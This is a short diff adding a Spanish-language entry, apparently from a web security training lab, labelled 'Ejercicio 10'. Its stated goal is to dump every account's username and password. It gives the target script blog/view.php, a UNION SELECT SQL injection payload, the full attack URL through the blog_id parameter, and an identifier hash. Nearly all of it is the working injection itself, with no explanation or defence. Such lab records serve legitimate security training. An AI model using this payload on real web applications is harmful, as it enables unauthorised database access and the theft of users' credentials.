@@ -1,0 +1,18 @@
+Ejercicio: 10
+
+Objetivo:
+    obtener listado de usuarios y contraseñas de todos las cuentas de la aplicación
+
+Punto de entrada:
+    blog/view.php
+
+Datos:
+    +UNION+select+*+from+users
+
+URL:
+    /blog/view.php?blog_id=3+UNION+select+*+from+users
+
+Identificador:
+    20210427-204338 40a114cdef0ec8d13a6a870f001c739e
+
+
